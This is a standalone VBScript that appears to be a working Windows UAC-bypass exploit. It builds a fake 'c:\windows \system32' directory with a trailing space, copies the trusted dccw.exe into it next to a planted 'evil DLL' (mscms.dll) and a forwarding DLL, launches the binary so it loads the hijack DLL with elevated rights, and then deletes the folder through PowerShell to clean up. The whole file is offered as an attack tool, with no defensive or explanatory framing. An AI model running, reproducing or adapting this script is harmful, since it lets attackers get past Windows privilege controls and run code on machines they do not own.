Set oFSO = CreateObject("Scripting.FileSystemObject")
Set wshshell = wscript.createobject("WScript.Shell")

' Get target binary and payload
' WScript.StdOut.Write("System32 binary: ")
'strBinary = WScript.StdIn.ReadLine()
Const strBinary = "dccw.exe"
' WScript.StdOut.Write("Path to your DLL: ")
'strDLL = WScript.StdIn.ReadLine()
Const strDLL = "mscms.dll"
' WScript.StdOut.Write("Path to original DLL: ")
'forwardedDLL = WScript.StdIn.ReadLine()
Const forwardedDLL = "dbghelper.dll"
' Create folders
Const target = "c:\windows \"
target_sys32 = (target & "system32\")
target_binary = (target_sys32 & strBinary)
If Not oFSO.FolderExists(target) Then oFSO.CreateFolder target End If
If Not oFSO.FolderExists(target_sys32) Then oFSO.CreateFolder target_sys32 End If

' Copy legit binary and evil DLL
oFSO.CopyFile ("c:\windows\system32\" & strBinary), target_binary
oFSO.CopyFile strDLL, target_sys32
oFSO.CopyFile forwardedDLL, target_sys32
' Run, Forrest, Run!
wshshell.Run("""" & target_binary & """")

' Clean files
'WScript.StdOut.Write("Clean up? (press enter to continue)")
'WScript.StdIn.ReadLine()
wshshell.Run("powershell /c ""rm -r """"\\?\" & target & """""""") 'Deletion using VBScript is problematic, use PowerShell instead